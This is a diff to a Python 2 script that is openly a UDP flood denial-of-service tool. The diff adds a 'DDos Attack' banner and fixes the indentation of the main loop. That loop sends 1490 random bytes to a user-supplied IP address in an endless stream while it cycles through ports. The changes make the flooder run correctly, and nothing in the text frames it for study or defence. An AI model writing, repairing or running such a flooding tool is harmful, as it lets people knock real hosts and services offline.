@@ -25,8 +25,14 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-
-
+os.system("figlet DDos Attack")
+print
+print " ____  ____                 _   _   _             _"
+print "|  _ \\|  _ \\  ___  ___     / \\ | |_| |_ __ _  ___| | __"
+print "| | | | | | |/ _ \\/ __|   / _ \\| __| __/ _' |/ __| |/ /"
+print "| |_| | |_| | (_) \\__ \\  / ___ \\ |_| || (_| | (__|   <"
+print "|____/|____/ \\___/|___/ /_/   \\_\\__|\\__\\__,_|\\___|_|\\_\\"
+print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
@@ -34,24 +40,20 @@ os.system("clear")
 os.system("figlet Attack Starting")
 print "[                    ] 0% "
 time.sleep(5)
-os.system("clear")
 print "[=====               ] 25%"
 time.sleep(5)
-os.system("clear")
 print "[==========          ] 50%"
 time.sleep(5)
-os.system("clear")
 print "[===============     ] 75%"
 time.sleep(5)
-os.system("clear")
 print "[====================] 100%"
 time.sleep(3)
-os.system("clear")
 sent = 0
 while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
-        port = port + 1
-            print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-            if port == 65534:
-                port = 1
+    port = port + 1
+    print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+    if port == 65534:
+        port = 1
+
